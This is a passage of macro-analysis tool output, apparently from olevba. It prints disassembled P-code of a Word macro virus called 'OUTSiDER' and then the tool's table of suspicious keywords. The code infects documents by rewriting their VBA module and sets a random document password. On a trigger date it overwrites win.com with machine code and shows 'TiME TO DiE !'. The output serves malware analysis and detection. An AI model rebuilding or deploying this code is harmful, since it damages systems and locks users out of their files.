' 	LitDI2 0x0014 
' 	For 
' Line #193:
' 	LitDI2 0x0001 
' 	LitStr 0x0001 " "
' 	Ld ADCodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #194:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADCodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #195:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #196:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	EndSub 
' Line #199:
' 	FuncDefn (Sub Outsider())
' Line #200:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #201:
' 	Dim 
' 	VarDefn Buffer (As Variant)
' Line #202:
' 	Dim 
' 	VarDefn Buffer1 (As Byte)
' Line #203:
' 	LitDI2 0x00B8 
' 	LitDI2 0x0010 
' 	LitDI2 0x0003 
' 	LitDI2 0x00B9 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0033 
' 	LitDI2 0x00D2 
' 	LitDI2 0x00CD 
' 	LitDI2 0x0013 
' 	LitDI2 0x00C3 
' 	ArgsArray Array 0x000B 
' 	St Buffer 
' Line #204:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0008 "\win.com"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #205:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	For 
' Line #206:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Buffer 0x0001 
' 	St Buffer1 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Ld i 
' 	Ld Buffer1 
' 	PutRec 
' Line #208:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #210:
' 	Ld Time 
' 	LitStr 0x0010 " - TiME TO DiE !"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "[OUTSiDER]"
' 	Concat 
' 	ParamNamed Prompt 
' 	LitStr 0x0012 "OUTSiDER'S MESSAGE"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	EndSub 
' Line #213:
' 	FuncDefn (Sub SetPassword())
' Line #214:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #215:
' 	Dim 
' 	VarDefn Passcode (As String)
' Line #216:
' 	ArgsCall Read 0x0000 
' Line #217:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #218:
' 	LitDI2 0x0009 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Add 
' 	FnInt 
' 	St RC 
' Line #219:
' 	Ld Passcode 
' 	Ld RC 
' 	Concat 
' 	St Passcode 
' Line #220:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #221:
' 	Ld Passcode 
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #222:
' 	EndSub 
' Line #223:
' 	FuncDefn (Sub InfectAD())
' Line #224:
' 	Dim 
' 	VarDefn ADLCount
' 	VarDefn i (As Integer)
' Line #225:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ADCodeModule 
' Line #226:
' 	Ld ADCodeModule 
' 	MemLd CountOfLines 
' 	St ADLCount 
' Line #227:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ADCodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Eq 
' 	IfBlock 
' Line #228:
' 	ExitSub 
' Line #229:
' 	ElseBlock 
' Line #230:
' 	LitDI2 0x0001 
' 	Ld ADLCount 
' 	Ld ADCodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #231:
' 	Ld C_DC2 
' 	Ld ADCodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #232:
' 	EndIfBlock 
' Line #233:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	MemSt Saved 
' Line #234:
' 	EndSub 
' Line #235:
' 	QuoteRem 0x0000 0x000F "OUTSiDER v1.00'"
' Line #236:
' 	QuoteRem 0x0000 0x0014 "East-Kazakhstan, UK'"
' Line #237:
' 	QuoteRem 0x0000 0x001F "10 january 2001 year. 11:00 am'"
' Line #238:
' 	QuoteRem 0x0000 0x0022 "New encrypt and stealth algorithm'"
' Line #239:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

